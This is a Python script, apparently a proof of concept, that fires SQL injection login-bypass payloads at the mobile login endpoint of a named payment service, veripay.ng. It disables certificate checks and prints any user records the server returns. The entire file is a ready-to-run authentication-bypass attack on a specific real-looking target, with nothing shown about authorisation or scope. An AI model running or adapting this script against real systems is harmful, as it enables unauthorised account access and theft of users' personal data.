#!/usr/bin/env python3
"""
Veripay Mobile API SQL Injection Tester
Target: https://veripay.ng/LoginMobile/checkUser
Description: Tests the mobile-specific endpoint extracted from the Android APK for SQL Injection vulnerabilities.
"""

import requests
import json
import urllib3

# Suppress insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = "https://veripay.ng/LoginMobile/checkUser"

# Common logic bypass payloads
PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "admin' #",
    "' OR 'x'='x"
]

def test_mobile_sqli():
    print("="*60)
    print("  Veripay Mobile API SQLi PoC")
    print(f"  Target: {TARGET_URL}")
    print("="*60)

    session = requests.Session()

    for payload in PAYLOADS:
        print(f"\n[*] Testing Payload: {payload}")
        
        data = {
            "userid": payload
        }
        
        try:
            # We use verify=False because the target environment might have SSL issues
            response = session.post(TARGET_URL, data=data, verify=False, timeout=10)
            
            print(f"    [-] HTTP Status: {response.status_code}")
            
            # The PHP file we extracted shows it echoes 'failed' if auth fails
            # or JSON data if auth succeeds.
            if "failed" not in response.text.lower() and ("user_id" in response.text or "user_name" in response.text):
                print("    [!] VULNERABLE: Authentication Bypassed! Received user object.")
                try:
                    # Try to parse the exposed user data
                    user_data = response.json()
                    print("    [!] Extracted Data Sample:")
                    print(json.dumps(user_data, indent=2))
                except json.JSONDecodeError:
                    print("    [!] Could not parse JSON, but response indicates bypass.")
                    print(f"    [!] Raw Response Snippet: {response.text[:200]}")
            else:
                print("    [-] Auth Failed or Payload Rejected.")
                
        except requests.exceptions.RequestException as e:
            print(f"    [-] Request Error: {e}")

if __name__ == "__main__":
    test_mobile_sqli()
